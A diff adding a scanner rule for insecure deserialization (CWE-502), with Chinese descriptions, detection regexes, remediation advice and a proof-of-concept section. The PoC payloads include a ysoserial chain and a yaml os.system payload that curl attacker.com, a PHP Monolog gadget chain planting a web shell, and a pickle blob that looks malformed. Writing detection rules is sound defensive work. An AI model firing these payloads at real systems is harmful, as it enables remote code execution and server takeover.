@@ -1,0 +1,110 @@
+id: "rule-insecure-deserialization"
+name: "Insecure Deserialization"
+name_cn: "不安全的反序列化"
+description: "系统对不可信数据进行反序列化，导致攻击者可注入恶意对象触发 RCE、权限提升或 DoS"
+
+owasp_category: "A08-software-data-integrity"
+owasp_subcategory: "Insecure Deserialization"
+cwe_id: "CWE-502"
+
+cvss:
+  vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  base_score: 9.8
+  severity: "critical"
+
+detection:
+  methods: ["DAST", "SAST"]
+  dast_signals:
+    high_specificity:
+      - type: "rce_confirmed"
+        pattern: "out_of_band_command_callback_received"
+        confidence: 0.98
+      - type: "ysoserial_chain_success"
+        pattern: "known_gadget_chain_executes"
+        confidence: 0.95
+    medium_specificity:
+      - type: "serialized_content_type"
+        pattern: "Content-Type: application/x-java-serialized-object|application/x-www-form-urlencoded.*rO0"
+        confidence: 0.70
+      - type: "base64_serialized"
+        pattern: "^(rO0|H4sI|eyJ)"
+        confidence: 0.65
+    low_specificity:
+      - type: "deserialization_endpoint"
+        pattern: "endpoint_accepts_serialized_data"
+        confidence: 0.30
+  sast_patterns:
+    - language: "java"
+      pattern: "ObjectInputStream\\.readObject|XMLDecoder\\.readObject"
+      confidence: 0.85
+    - language: "python"
+      pattern: "pickle\\.loads|yaml\\.load\\([^)]*\\)"
+      confidence: 0.85
+    - language: "php"
+      pattern: "unserialize\\(\\$_"
+      confidence: 0.90
+    - language: "ruby"
+      pattern: "Marshal\\.load|YAML\\.load"
+      confidence: 0.85
+  multi_layer:
+    enabled: true
+    min_signals: 2
+    high_specificity_skips_min: true
+  false_positive_filters:
+    - filter: "whitelist_exists"
+      condition: "class_whitelist_configured"
+      action: "downgrade"
+      target_confidence: "low"
+
+poc:
+  enabled: true
+  request_template: |
+    POST {{url}} HTTP/1.1
+    Host: {{host}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+    Content-Type: application/x-java-serialized-object
+    Content-Length: {{len}}
+    Connection: close
+
+    {{payload}}
+  payloads:
+    - name: "java_ysoserial_commons"
+      value: "{{ysoserial CommonsCollections5 'curl http://attacker.com/rce'}}"
+      description: "Java CommonsCollections 反序列化 RCE"
+      risk: "critical"
+    - name: "php_object_injection"
+      value: 'O:42:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"*handler";N;s:10:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;O:29:"Monolog\\Handler\\SyslogUdpHandler":2:{s:9:"*socket";O:33:"Monolog\\Handler\\RotatingFileHandler":2:{s:9:"*filename";s:8:"/tmp/rce.sh";s:9:"*maxFiles";i:1;}s:9:"*ident";s:6:"<?php system($_GET[cmd]); ?>"}}}}'
+      description: "PHP Monolog 反序列化 RCE"
+      risk: "critical"
+    - name: "python_pickle_rce"
+      value: "gASVKgAAAAAAAACMCG9wZW50ZXhllIwKZmlsZV9wb2ludHM9Jw==."
+      description: "Python pickle 反序列化 RCE"
+      risk: "critical"
+    - name: "yaml_deserialization"
+      value: "!!python/object/apply:os.system ['curl http://attacker.com/rce']"
+      description: "Python yaml.load 反序列化 RCE"
+      risk: "critical"
+  verification:
+    - type: "callback_received"
+      description: "攻击者服务器收到命令执行回调"
+    - type: "content_match"
+      pattern: "command_output"
+      description: "响应中出现命令执行结果"
+
+remediation:
+  priority: "P0"
+  summary: "禁止对不可信数据进行反序列化，使用白名单限制可反序列化的类"
+  details:
+    - "避免反序列化不可信数据，使用数据格式（JSON）替代对象序列化"
+    - "实施类白名单，仅允许反序列化已知安全的类"
+    - "使用 ObjectInputFilter（Java 9+）限制可反序列化的类"
+    - "对序列化数据做签名校验，防止篡改"
+    - "升级反序列化库到最新安全版本"
+  references:
+    - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    - "https://cwe.mitre.org/data/definitions/502.html"
+    - "https://github.com/frohoff/ysoserial"
+
+knowledge_source:
+  file: "知识库/deserialization-test.md"
+  methodology: "知识库/deserialization-test.md + jndi-injection-test.md"
